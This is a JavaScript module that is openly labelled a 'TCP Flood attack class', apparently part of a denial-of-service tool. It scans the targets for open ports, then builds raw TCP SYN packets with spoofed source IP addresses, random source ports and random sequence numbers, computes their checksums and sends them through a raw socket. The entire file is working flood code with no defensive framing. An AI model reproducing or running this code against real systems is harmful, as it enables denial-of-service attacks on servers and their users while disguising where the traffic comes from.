/**
 * Sending a TCP SYN packet properly using the raw-socket package.
 */
const crypto = require('crypto');

const raw = require('raw-socket');
const { memoize } = require('lodash');

const fakeIP = require('./helpers/fake-ip');
const scan = require('./helpers/scan');
const getRandom = require('../get-random');

/**
 * TCP Flood attack class
 */
module.exports = {

  /**
   * Prepare the attack
   */
  async prepare(ips, port) {
    return scan(ips, port);
  },

  /**
   * Initiate TCP Flood
   */
  attack(report) {
    if (report.length === 0) {
      throw new Error('Do not see any open ports for TCP flood attack :(');
    }

    // Create a raw socket using TCP
    const socket = raw.createSocket({
      protocol: raw.Protocol.TCP
    });

    socket.on('error', () => { });

    const { ip, port } = report[getRandom(0, report.length - 1)];

    const packet = memoize(makeSyn)(ip, port);

    // Send packet with offset 0, length = packet.length.
    // The port data is in the packet.
    socket.send(packet, 0, packet.length, ip, () => {
      socket.close();
    });
  }
};

/**
 * Generate pseudo-header
 * @param {number} source source ip
 * @param {number} destination destination ip
 * @param {number} packetLength tcp packet length
 * @return {Buffer} pseudo-header buffer
 */
const getHeader = (source, destination, packetLength) => {

  // Create Pseudo-header buffer
  const header = Buffer.alloc(12);

  // Needs to be zeros
  header.fill(0);

  // Source IP
  header.writeUInt32BE(source, 0);

  // Destination IP
  header.writeUInt32BE(destination, 4);

  // Specify Protocol (6 - TCP)
  header.writeUInt8(6, 9);

  // Write the TCP packet length of which we are generating a pseudo-header for.
  // Does not include the length of the psuedo-header.
  header.writeUInt16BE(packetLength, 10);

  return header;
};

/**
 * Generate SYN packet
 * @param {number} ip
 * @param {number} port
 * @return {Buffer} the TCP SYN packet
 */
const makeSyn = (ip, port) => {

  // Create base for TCP packet. Everything is set to nil except for SYN flags
  const packet = Buffer.from('0000000000000000000000005002200000000000', 'hex');

  // Need 4 random bytes as sequence. Needs to be random to avoid collision
  crypto.randomBytes(4).copy(packet, 4);

  // Source port
  packet.writeUInt16BE(getRandom(1, 65535), 0);

  // Destination port
  packet.writeUInt16BE(port, 2);

  // Generate checksum with pseudo-header
  const sum = raw.createChecksum(
    getHeader(fakeIP(), ip, packet.length),
    packet
  );

  // Write the check sum
  packet.writeUInt16BE(sum, 16);

  return packet;
};
